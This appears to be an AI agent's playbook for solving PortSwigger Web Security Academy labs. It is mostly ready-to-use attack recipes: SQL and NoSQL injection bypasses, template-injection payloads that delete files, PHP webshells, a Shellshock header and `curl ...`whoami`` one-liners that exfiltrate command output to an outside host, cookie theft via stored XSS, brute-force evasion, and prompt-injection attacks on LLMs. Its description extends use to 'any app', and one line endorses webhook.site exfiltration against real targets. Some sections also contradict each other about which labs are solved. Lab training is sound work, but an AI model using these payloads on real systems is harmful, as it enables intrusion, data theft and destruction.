---
name: portswigger-academy
sources: portswigger_academy, original_research
description: Complete PortSwigger Web Security Academy playbook — solve every lab type across 31 categories (SQLi, XSS, CSRF, SSRF, request smuggling, authentication, access control, business logic, deserialization, prototype pollution, XXE, JWT, OAuth, LLM attacks, web cache poisoning/deception, race conditions, GraphQL, NoSQLi, file upload, path traversal, OS command injection, SSTI, host header, CORS, clickjacking, DOM, API testing, WebSockets, information disclosure). Use when testing PortSwigger Academy labs (web-security-academy.net) or any app exhibiting these classes.
---

# PortSwigger Web Security Academy — lab playbook

Labs live at `https://<instance>.web-security-academy.net/`. Each lab page has
"Access the lab" → spawns a per-user instance. Solve it, then the lab marks solved.
Ground truth: 272 labs / 31 categories.

## SQL injection (18)
- Login bypass: `administrator'--` in username.
- WHERE clause hidden data: `?category=Gifts'+OR+1=1--`
- DB type/version (Oracle/MySQL/MSSQL): Oracle `UNION SELECT banner,NULL FROM v$version--`;
  MySQL/MSSQL `UNION SELECT @@version,NULL#` (use **`#`** or `--+` for MySQL comments — `--` alone fails).
- List DB contents: `UNION SELECT table_name,NULL FROM information_schema.tables--` → columns → data (Oracle: `all_tables`).
- UNION column count: `ORDER BY N--`; find text column; retrieve data.
- Blind: boolean (`AND SUBSTRING(...)='a'`), time-based (`; WAITFOR DELAY`/`SLEEP`), OOB (DNS via Collaborator).
- Filter bypass: XML/encoding, `%09`, comments `/**/`.
- **Verified working:** retrieve-hidden-data, login-bypass, Oracle version, MySQL version (4/4 tested).

## Cross-site scripting (30)
- Reflected: `<script>alert(1)</script>` in search/param.
- Stored: comment/name fields.
- DOM: `#` fragment sinks (innerHTML, document.write, eval).
- Context breakouts: attribute, JS string, href.
- Sanitizer/allowlist bypass, WAF bypass (encoding, tags like `<svg onload>`, `<img src=x onerror>`).
- CSP bypass, dangling markup, AngularJS sandbox escape.

## CSRF (11)
- No token, token not validated, token tied to another session, token in cookie.
- SameSite=Lax bypass via `_method`/GET, method override.
- Bypass via Referer/Origin omission.

## SSRF (7)
- Basic internal fetch, blacklist bypass (decimal/hex IP, `localhost`, redirect).
- Whitelist bypass (`@`, `#`, subdomain).
- SSRF via open redirect, via blind (Collaborator), via Referer.
- Cloud metadata: `http://169.254.169.254/latest/meta-data/`.

## Request smuggling (22)
- CL.TE, TE.CL, TE.TE, TE.0, H2.CL, H2.TE.
- Detect via timing; exploit for cache poisoning / bypass front-end controls.
- Tools: Burp HTTP Request Smuggler, smuggler.py.

## Authentication (14)
- Username enumeration (response diff, timing).
- Brute-force / rate-limit bypass (IP rotation, X-Forwarded-For).
- 2FA bypass (response manipulation, brute, disable via API).
- Password reset flaws (token leak, predictable, host header poisoning).
- Stay-logged-in cookie (predictable base64), password reset poisoning.

## Access control (13)
- IDOR via `id` param; unprotected admin; URL-based ACL (`X-Original-URL`, `X-Rewrite-URL`).
- Method-based bypass, `Referer`-based, multi-step.
- Parameter-based role (`roleid`, `?admin=true`).

## Business logic (12)
- Price/quantity manipulation, negative values, coupon abuse, workflow bypass, inconsistent handling, weak isolation.

## Deserialization (10)
- PHP: `O:4:"User":...` + phpggc gadget.
- Java: ysoserial chain via `ViewState`/`rememberMe` cookie.
- Python pickle `__reduce__`.

## Prototype pollution (10)
- Client: `__proto__`/`constructor.prototype` in URL/JSON → DOM XSS gadget.
- Server: Node `Object.assign`/`merge` → RCE via child_process gadget.

## XXE (9)
- File read `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
- SSRF via XXE, blind OOB (Collaborator), via SVG, via XInclude.

## JWT (8)
- alg:none, HS256↔RS256 confusion (sign with public key), weak secret brute, `kid` injection (path/SQLi), `jku`/`x5u` header injection.

## LLM attacks (8)
- Prompt injection (direct/indirect), AI API abuse, excessive agency, output handling (XSS via LLM), training-data extraction, system-prompt leak.

## Web cache poisoning (13) / deception (5)
- Unkeyed header/param/cookie poisoning, `X-Forwarded-Host`, cache deception via path suffix (`.css`, `%2f`, `;`).

## Race conditions (6)
- Single-packet attack (HTTP/2), limit-overrun on coupon/redeem/2FA, TOCTOU.

## GraphQL (5)
- Introspection, IDOR via `node(id:)`, mutation authz, field suggestion when introspection off.

## NoSQL injection (4)
- Mongo `$ne`/`$regex`/`$where` in JSON body → auth bypass / data extraction.

## File upload (7) / path traversal (6) / OS command injection (5) / SSTI (7)
- Upload: webshell, content-type/magic-byte bypass, `.htaccess`, path traversal in filename.
- Traversal: `../`, absolute, double-encoding, validation bypass.
- OS cmd: `;id`, `|id`, `$(id)`, blind OOB.
- SSTI: `{{7*7}}`, `${7*7}`, engine-specific RCE (Jinja2 `__class__`, Freemarker, ERB).

## Host header (7)
- Password-reset poisoning, cache poisoning, routing SSRF, `X-Forwarded-Host`, absolute URL.

## OAuth (6) / JWT (8) / CORS (3) / Clickjacking (5) / WebSockets (2) / API testing (5) / information disclosure (5) / essential skills (2)
- OAuth: redirect_uri bypass, implicit leak, CSRF on linking, profile-claim hijack.
- CORS: origin reflection + credentials, null origin, subdomain trust, unescaped regex.
- Clickjacking: frame + prefill + button overlap.
- WebSockets: CSWSH (missing Origin check), message tampering.
- API testing: BOLA/IDOR, mass assignment, server-side param pollution, undocumented endpoints.
- Info disclosure: error messages, debug pages, backup files, source maps.
- Essential skills: obfuscation, encoding.

## How to solve a lab
1. Open the lab URL → "Access the lab" → get `<instance>.web-security-academy.net`.
2. Identify the category (from the URL) → apply the technique above.
3. Verify: the lab page shows "Congratulations, you solved the lab!".
4. Capture the exact request/response as the PoC.

Use Burp (proxy 127.0.0.1:8080) + Playwright for all labs. Work every category.

## Harness mechanics (these cost real debugging time — do not rediscover them)

**Launch and status are JavaScript-injected.** Fetching the lab page with `curl`/`requests`
returns the description only: no "ACCESS THE LAB" link and no lab-status widget. You must
load it in a real browser (Playwright) and read `a:has-text("ACCESS THE LAB")` plus
`.widgetcontainer-lab-status.is-solved`. The launch link is
`/academy/labs/launch/<hash>`; a `GET` with redirects disabled returns the instance URL in
`Location`.

**Per-account session.** PortSwigger now fronts login with Auth0
(`login.portswigger.net/u/login` → `/authorize/resume` → an auto-submit form posted to
`https://portswigger.net/signin-oidc`). Driving that chain with plain HTTP loops; a browser
is far more reliable. Once logged in, export the context's storage state and reuse the
cookies for API calls to `portswigger.net`.

**Verify on the instance, not the Academy page.** The instance banner
(`widgetcontainer-lab-status is-solved`) flips immediately; the Academy lab page can lag.

**CSRF fields are not always quoted.** These labs emit
`<input required type=hidden name=csrf value=abc123>` as often as the quoted form. A regex
that requires `name="csrf" value="..."` silently sends no token, and the server answers
`Missing parameter 'csrf'` (400) or, on some labs, a misleading
`Invalid username or password`. Accept `"`, `'`, and bare values:

```python
r'name=["\']?csrf["\']?\s+value=(?:"([^"]+)"|\'([^\']+)\'|([^\s>]+))'
```

Also note the token frequently sits **after** the submit button in the form, so a truncated
form dump will miss it.

**Leaks hide in redirect bodies.** Several access-control labs return the stolen API key in
the body of a `302`. `requests` follows the redirect by default and throws the evidence away
— use `allow_redirects=False` for these.

**Retry login.** A freshly launched instance occasionally rejects the documented
`wiener:peter` on the first attempt. Retry 3–4 times with a short delay before concluding
the instance is broken.

**Out-of-band: the obvious approach is wrong.** Lab instances **cannot reach the public
internet** — `webhook.site` records zero callbacks (verified for curl, wget, bash
`/dev/tcp`, nc and python3-urllib exfiltration), and a real `interactsh` session received
nothing either. Lab DNS resolves *only* Collaborator domains, and it is intercepted
locally. So there are exactly two working channels:

```python
# 1. Interaction-only labs (blind SSRF / blind XXE / blind OS command injection).
#    The lab detects the DNS lookup of the collaborator domain itself - nothing has to
#    answer, and no real Collaborator client is needed. Any random subdomain works.
marker = '1a2b3c4d5e6f7g8h9i0j.oastify.com'     # or .burpcollaborator.net / oast.pro
payload = f"x||nslookup {marker}||"

# 2. Data-exfiltration labs: exfiltrate to the lab's OWN exploit server, which the lab
#    CAN reach, then read lab.access_log(). /etc/hostname ends in a newline so it must
#    go in a query string, never a URL authority; some instances reject inline
#    <!ENTITY>, forcing the two-stage external-DTD technique.
```

**When the interaction's CONTENT must be read back** (not merely "did one fire"),
the two channels above are not enough — Burp Suite Professional is the answer, and it is
often already running on the box. It exposes its Collaborator client as an official
**MCP server on `http://127.0.0.1:9876`** (SSE; override with `BURP_MCP_URL`):

* `generate_collaborator_payload` → `<id>.oastify.com` plus a Payload ID
* `get_collaborator_interactions` → the recorded requests, including the full
  `httpDetails.request` line

This is a complete headless readback path. The labs **can** reach the real Collaborator
server (DNS *and* HTTP) from their AWS IPs — only arbitrary third-party listeners are
blocked. **Exfiltrate over HTTP, not DNS:** the MCP returns `httpDetails.request` verbatim
but reduces `dnsDetails` to `{"queryType":"A"}`, so the raw DNS query carrying the value is
not exposed. Working shape: ``||curl http://<payload>/`whoami`||``.

A hand-rolled `polling.oastify.com/burpresults?biid=<payload-id>` poller returns `{}` even
for an interaction Burp reads fine — the visible Payload ID is not the poll key. Do not
conclude "unsolvable" from that. This exact mistake was made once and four labs were
nearly written off; the value was randomised per instance and Burp's own client read it
back immediately.

(For a **real** target, webhook.site is fine — the two-regime distinction matters.)

**Victim-browser labs are still pure HTTP.** For stored XSS, CSRF, CORS, clickjacking,
cache deception and dangling markup, host the payload on the lab's exploit server
(`POST /` with `responseFile`/`responseHead`/`responseBody`/`formAction=STORE`) and call
`POST /deliver-to-victim`. PortSwigger runs the victim for you; read the result from
`GET /access-log`. The email client is at `GET /email` — that is how you read a 2FA code or
a reset link.

**The Academy edge routes on the `Host` header.** A request whose `Host` names the
exploit server goes *to the exploit server*, not the lab — which is why a spoofed-Host
test appears to "do nothing". It reaches the lab backend only if it carries a valid lab
session cookie, so fetch `/` on the lab first, then send the spoofed `Host` **with that
cookie**. Duplicate `Host` headers are rejected `400 Duplicate header names are not
allowed` on an anonymous request but accepted (and the second value reflected) once the
cookie is present. Do this over a raw TLS socket — the requests/urllib3 stack does not
route duplicate-`Host` requests the same way.

**Raw bytes for smuggling.** `requests` normalises away the conflicting
`Content-Length`/`Transfer-Encoding` these labs need; build the request on a raw
`socket`+`ssl` connection and keep `Connection: keep-alive` so the smuggled prefix lands on
the next request.

**WebSockets.** `websockets`/`websocket-client` may not be installed. A minimal RFC6455
client (HTTP Upgrade handshake + masked frames) is ~80 lines and removes the dependency.

## VERIFIED SOLVE TECHNIQUES (auto-learned, tested)

### Auth handling (critical)
- Labs requiring login: POST `/login` with fields `csrf`, `username`, `password` (fetch `/login` first, regex `name=["\']?csrf["\']?\s+value=["\']?([^"\'\s>]+)`). Creds `wiener:peter` unless stated.
- A fresh `requests.Session()` is NOT logged in — always login before authenticated labs.

### Access control
- unprotected-admin-functionality → panel at **`/administrator-panel`** (not `/admin`); `GET /administrator-panel/delete?username=carlos`.
- unprotected-admin-functionality-with-unpredictable-url → the panel path is leaked in the home page JS as `'/admin-xxxxxx'`; scrape it, then `GET /admin-xxxxxx/delete?username=carlos`.
- user-role-controlled-by-request-parameter → login, set cookie **`Admin=true`**, then `/admin/delete?username=carlos`.
- user-role-can-be-modified-in-user-profile → login, `POST /my-account/change-email` as **JSON** with `{"email":"a@b.c","roleid":2}`, then `GET /admin/delete?username=carlos`.
- user-id-controlled-by-request-parameter → login, `GET /my-account?id=carlos`, extract `API Key`, POST `/submitSolution` (csrf).
- …with-unpredictable-user-ids → the victim's id is on a blog post (`/post?postId=N`, look for `userId=`), then the same flow.
- …with-data-leakage-in-redirect → `GET /my-account?id=carlos` with **`allow_redirects=False`** and read the key out of the 302 body.
- …with-password-disclosure → `GET /my-account?id=administrator`, regex the password input (`value='...'` — single quotes!), log in as administrator, delete carlos.
- method-based-access-control-can-be-circumvented → as the **low-privilege** user, `GET /admin-roles?username=wiener&action=upgrade` (the check is on the method only).
- multi-step-process-with-no-access-control-on-one-step → `POST /admin-roles` with `username=wiener&action=upgrade&confirmed=true`.
- referer-based-access-control → `GET /admin-roles?username=wiener&action=upgrade` with `Referer: <lab>/admin`.
- insecure-direct-object-references → login, `GET /download-transcript/1.txt`, regex `password is ([A-Za-z0-9]+)`, login as carlos **with csrf**.
- url-based-access-control-can-be-circumvented → login, header **`X-Original-URL: /admin`**, then `GET /?username=carlos` with `X-Original-URL: /admin/delete`.

### Authentication
- username-enumeration-via-different-responses → `Invalid username` vs `Incorrect password` in the login response, then brute-force the password (302 = success).
- username-enumeration-via-subtly-different-responses → the valid username's error text differs by a trailing space; group responses by exact error string and take the singleton.
- username-enumeration-via-response-timing → valid usernames take measurably longer with a long password; rotate `X-Forwarded-For` to dodge the IP block.
- broken-bruteforce-protection-ip-block → 3 failures block the IP, but a **successful login resets the counter**: interleave `wiener:peter` with each `carlos` guess.
- username-enumeration-via-account-lock → 5 bad attempts make the valid username answer `too many incorrect login attempts`; wait ~65s for the lock to reset, then brute-force.
- 2fa-simple-bypass → log in as **carlos:montoya** and navigate straight to `/my-account`.
- 2fa-broken-logic → `verify` in `POST /login2` names the account; read your own code from the email client and submit it with `verify=carlos`, else brute-force 0000-9999.
- password-reset-broken-logic → the reset token is never validated: `POST /forgot-password?temp-forgot-password-token=x` with `username=carlos` and the new password.
- brute-forcing-a-stay-logged-in-cookie → the cookie is `base64(username + ':' + md5(password))`; md5 each candidate and present the forged cookie.
- offline-password-cracking → stored XSS in a comment steals the victim's `stay-logged-in` cookie to the exploit-server access log; md5-crack it against the password list, log in, `POST /my-account/delete`.
- password-reset-poisoning-via-middleware → `X-Forwarded-Host: <exploit-server>` on `POST /forgot-password` for carlos; read the token from the access log and reset on the real host.
- password-brute-force-via-password-change → `POST /my-account/change-password` with `username=carlos`, two **different** new passwords; `New passwords do not match` means the current password was right.
- broken-brute-force-protection-multiple-credentials-per-request (expert) → `POST /login` with a **JSON array** of passwords in one request.
- 2fa-bypass-using-a-brute-force-attack (expert) → brute-force `mfa-code`; the session is dropped after two wrong codes, so re-login and retry the same code.

### SSRF
- whitelist-filter → `stockApi=http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos` (POST /product/stock).
- blind/shellshock-exploitation → the stock checker's `Referer` is fetched with curl; inject `() { :; }; /usr/bin/nslookup $(whoami).<oob-host>` into `User-Agent` and sweep the last octet of `http://192.168.0.N:8080` in `Referer` until the OOB listener fires.

### SQLi
- retrieve-multiple-values-in-single-column → MySQL: `Gifts'+UNION+SELECT+CONCAT(username,0x7e,password),NULL+FROM+users--`.
- listing-database-contents (non-Oracle) → `information_schema.tables` → `columns` → the `users_*` table, then log in as administrator.
- listing-database-contents (Oracle) → `all_tables` / `all_tab_columns`, remember the `FROM dual` prefix.
- blind labs are injected in the **`TrackingId` cookie**; build one boolean/time/error oracle and extract the administrator password with a **binary search** over code points (36x fewer requests than a linear scan).

### SSTI
- basic lab engine is **ERB** (Ruby): `<%= 7*7 %>` → 49. RCE: `message=<%= system('rm /home/carlos/morale.txt') %>`.
- basic-code-context is **Tornado**: `user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}` via `POST /my-account/change-blog-post-author-display`.
- using-documentation is **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}`.
- information-disclosure-via-user-supplied-objects is **Django**: `{% debug %}` to enumerate, then `{{settings.SECRET_KEY}}` and submit it.

### Path traversal (all solved)
- simple `../../../etc/passwd`; absolute `/etc/passwd`; non-recursive `....//....//....//etc/passwd`; superfluous `%252e%252e%252f`; start-of-path `/etc/passwd`; null-byte `../../../etc/passwd%00.png`.

### Was "still hard" — now reachable headlessly
- **CORS** (basic origin reflection / null origin / trusted insecure protocols): store the
  credentialed `XMLHttpRequest` page on the exploit server, deliver to victim, read the key
  from the access log, `submitSolution`. The null-origin variant needs
  `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="...">`.
- **Blind OS command injection**: output redirection (`||whoami>/var/www/images/output.txt||`
  then `GET /image?filename=output.txt`) or OOB via a `nslookup` against the webhook.site host.
- **Stored XSS / cache deception / clickjacking**: exploit server + `deliver-to-victim`.
- **Request smuggling and race conditions**: raw sockets; for races either an HTTP/2
  single-packet attack or a large simultaneous thread-pool burst.

## VERIFIED SOLVE TECHNIQUES — round 2 (tested this session)

### File upload (6/6 solved)
- Endpoint: `POST /my-account/avatar` (login `wiener:peter`, multipart field `avatar`, plus `user=wiener` and `csrf`).
- Shell served at **`/files/avatars/<name>`**; upload content `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
- **The lab is solved by SUBMITTING the secret**, not just reading it: `POST /submitSolution` with `answer=<secret>`.
- content-type bypass: send `Content-Type: image/png`. blacklist bypass: `.phtml`. obfuscated: `shell.php%00.jpg` / `shell.php.jpg`.
- path traversal: filename `../shell.php` → served at `/files/avatars/shell.php`.
- polyglot: `GIF89a<?php ... ?>` as `polyglot.php`; the response is `GIF89a` + secret → **strip the `GIF89a` prefix before submitting**.

### Information disclosure (5/5 solved)
- debug page: `GET /cgi-bin/phpinfo.php` → regex `SECRET_KEY </td><td...>([A-Za-z0-9]+)` → `POST /submitSolution answer=<key>` (returns `{"correct":true}`).
- backup files: `GET /backup/ProductTemplate.java.bak` → hardcoded creds → login as administrator.
- version-control history: `GET /.git/` (dir listing) + `/.git/logs/HEAD`, `/.git/config` → recover the admin password → login.
- error messages: trigger a product error to leak the framework version.
- auth bypass: leaked internal header used to reach `/admin`.
- **Submit endpoint for ALL these: `POST /submitSolution` with body `answer=<value>`** (form on the instance banner: `<button id='submitSolution' path='/submitSolution' parameter='answer'>`).

### API testing (5/5 solved)
- Docs lab: `GET /api` returns the API docs page; enumerate documented endpoints.
- unused endpoint: `GET /api/user/<username>`.
- mass assignment: `POST /api/checkout` with `{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}` (GET returns `{"chosen_discount":{"percentage":0},"chosen_products":[]}`).
- SSPP (query string / REST URL): duplicate the parameter (`%26username=carlos` / path).

### GraphQL (2/3 solved)
- **Endpoint is `GET /api?query=<urlencoded>`** (NOT `/graphql`, NOT POST). `{__typename}` → `{"data":{"__typename":"query"}}`.
- accidental field exposure: introspection `{__schema{types{name}}}`.
- find the endpoint: `GET /api?query={__typename}`.

### NoSQL injection (4/4 solved)
- bypass auth: login POST JSON `{"username":"administrator","password":{"$ne":""}}`.
- detection / extract-data / unknown-fields: `/filter?category=...` and `/user/lookup?user=` with `' && this.password...` / `$where` operators.

### SQLi
- retrieve-multiple-values-in-single-column → `category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` (payload in the SECOND column).

### Still open (6)
- CORS ×2 → need the Academy exploit server (store exploit, deliver to victim).
- blind OS command output redirection, SSTI basic-code-context, XXE XInclude, GraphQL reading-private-posts → payload/endpoint still being pinned.
